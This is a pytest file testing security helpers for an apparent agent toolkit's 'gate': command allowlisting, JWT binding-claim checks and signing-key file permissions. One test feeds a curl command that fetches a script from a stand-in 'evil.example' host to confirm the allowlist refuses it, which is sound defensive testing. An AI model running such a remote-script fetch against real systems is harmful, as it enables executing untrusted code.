"""Direct tests for the gate helpers added by the security hardening."""

import os
import stat
import subprocess
import sys
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT))

jwt = pytest.importorskip("jwt", reason="PyJWT not available")

from gate import keys as gate_keys
from gate.attest import CheckResult, _argv, _refuse_untrusted, _run_repo_command
from gate.core import _check_binding_claims


class TestAttestHelpers:
    def test_argv_splits_string_and_keeps_list(self):
        assert _argv("python3 -m pytest -q") == ["python3", "-m", "pytest", "-q"]
        assert _argv(["npm", "test"]) == ["npm", "test"]
        assert _argv(["npm", 1]) == ["npm", "1"]

    def test_refuse_untrusted_returns_none_for_trusted(self):
        assert _refuse_untrusted("python3 -m pytest -q", "test_command") is None

    def test_refuse_untrusted_names_the_key_and_reason(self):
        result = _refuse_untrusted(["curl", "https://evil.example/x.sh"], "lint_command")
        assert isinstance(result, CheckResult)
        assert result.passed is False
        assert result.detail.startswith("lint_command not allowlisted")
        assert "curl" in result.detail

    def test_run_repo_command_refuses_before_running(self, tmp_path):
        marker = tmp_path / "ran"
        result = _run_repo_command(f"touch {marker}", tmp_path, "test_command")
        assert result.passed is False
        assert not marker.exists()

    def test_run_repo_command_runs_trusted(self, tmp_path):
        result = _run_repo_command(["true"], tmp_path, "test_command")
        assert result.passed is True


class TestCheckBindingClaims:
    def _repo(self, tmp_path):
        subprocess.run(["git", "init", "-q"], cwd=tmp_path, check=True, capture_output=True)
        subprocess.run(["git", "remote", "add", "origin", "https://github.com/acme/billing.git"],
                       cwd=tmp_path, check=True, capture_output=True)
        ref = subprocess.run(["git", "symbolic-ref", "-q", "HEAD"], cwd=tmp_path,
                             capture_output=True, text=True).stdout.strip()
        return ref

    def test_check_binding_claims_accepts_matching_token(self, tmp_path):
        ref = self._repo(tmp_path)
        payload = {"action": "push", "commit_sha": "abc123", "aud": "acme/billing", "ref": ref}
        assert _check_binding_claims(payload, tmp_path, "push", "abc123") is None

    @pytest.mark.parametrize("field, value, word", [
        ("action", "commit", "action"),
        ("commit_sha", "zzz999", "commit_sha"),
        ("aud", "evil/other", "aud"),
        ("ref", "refs/heads/release-2026-10", "ref"),
    ])
    def test_check_binding_claims_rejects_each_mismatch(self, tmp_path, field, value, word):
        ref = self._repo(tmp_path)
        payload = {"action": "push", "commit_sha": "abc123", "aud": "acme/billing", "ref": ref}
        payload[field] = value
        error = _check_binding_claims(payload, tmp_path, "push", "abc123")
        assert error is not None
        assert word in error

    def test_check_binding_claims_skips_repo_and_ref_outside_git(self, tmp_path):
        payload = {"action": "commit", "commit_sha": "abc123", "aud": "whatever", "ref": "refs/heads/x"}
        assert _check_binding_claims(payload, tmp_path, "commit", "abc123") is None


class TestKeyHelpers:
    def test_project_key_dir_is_under_home_and_stable(self, tmp_path, monkeypatch):
        monkeypatch.setenv("HOME", str(tmp_path / "home"))
        project = tmp_path / "billing-app"
        project.mkdir()
        first = gate_keys.project_key_dir(project)
        assert first == gate_keys.project_key_dir(project)
        assert str(first).startswith(str(tmp_path / "home" / ".agent-toolkit" / "keys"))
        other = tmp_path / "other-app"
        other.mkdir()
        assert gate_keys.project_key_dir(other) != first

    def test_default_key_path_filename(self, tmp_path, monkeypatch):
        monkeypatch.setenv("HOME", str(tmp_path / "home"))
        path = gate_keys.default_key_path(tmp_path)
        assert path.name == "signing.key"
        assert path.parent == gate_keys.project_key_dir(tmp_path)

    def test_write_secret_file_is_0600_from_creation(self, tmp_path):
        path = tmp_path / "keys" / "k"
        gate_keys._write_secret_file(path, "s3cr3t-value-with-enough-length-0123456789\n")
        assert stat.S_IMODE(path.stat().st_mode) == 0o600
        assert path.read_text().startswith("s3cr3t")
        gate_keys._write_secret_file(path, "replaced\n")
        assert path.read_text() == "replaced\n"
        assert stat.S_IMODE(path.stat().st_mode) == 0o600

    def test_generate_signing_secret_explicit_path_and_meta(self, tmp_path):
        key = tmp_path / "custom" / "signing.key"
        returned = gate_keys.generate_signing_secret(key)
        assert returned == key.resolve()
        assert len(key.read_text().strip()) >= gate_keys.MIN_SECRET_CHARS
        meta = key.parent / "signing.meta.json"
        assert '"alg": "HS256"' in meta.read_text()

    def test_validated_enforces_min_length(self):
        long_secret = "x" * gate_keys.MIN_SECRET_CHARS
        assert gate_keys._validated(f"  {long_secret}\n", "env") == long_secret
        with pytest.raises(ValueError, match="env"):
            gate_keys._validated("short", "env")

    def test_env_secret_too_short_is_rejected(self, monkeypatch, tmp_path):
        monkeypatch.setenv("AGENT_TOOLKIT_GATE_SECRET", "short")
        with pytest.raises(ValueError):
            gate_keys.load_signing_secret(tmp_path)
